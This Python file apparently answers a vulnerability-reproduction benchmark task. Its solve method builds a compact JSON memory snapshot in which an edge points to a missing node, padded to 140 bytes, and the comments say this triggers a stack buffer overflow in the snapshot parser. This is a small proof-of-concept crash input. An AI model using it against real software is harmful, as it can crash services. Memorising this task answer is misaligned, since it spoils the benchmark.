import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # The vulnerability is triggered by a reference to a non-existent node
        # in a memory snapshot. This PoC creates a JSON-based snapshot with
        # one node (id: 1) and one edge from node 1 to a non-existent node (id: 2).
        # The parser fails to validate the lookup for node 2, dereferences an
        # invalid iterator, and causes a stack buffer overflow.
        #
        # The length is padded to exactly 140 bytes by adjusting the length of
        # a string value within the JSON. The base structure without padding
        # in the 'name' field is 100 bytes long, so 40 characters are added.
        
        poc_data = {
            "nodes": [
                {
                    "id": 1,
                    "name": "A" * 40,
                    "size": 0,
                    "type": "B"
                }
            ],
            "edges": [
                {
                    "from_id": 1,
                    "to_id": 2,
                    "type": "C",
                    "name": "D"
                }
            ]
        }
        
        # Serialize to a compact JSON representation and encode to bytes.
        poc_bytes = json.dumps(poc_data, separators=(',', ':')).encode('utf-8')
        
        return poc_bytes
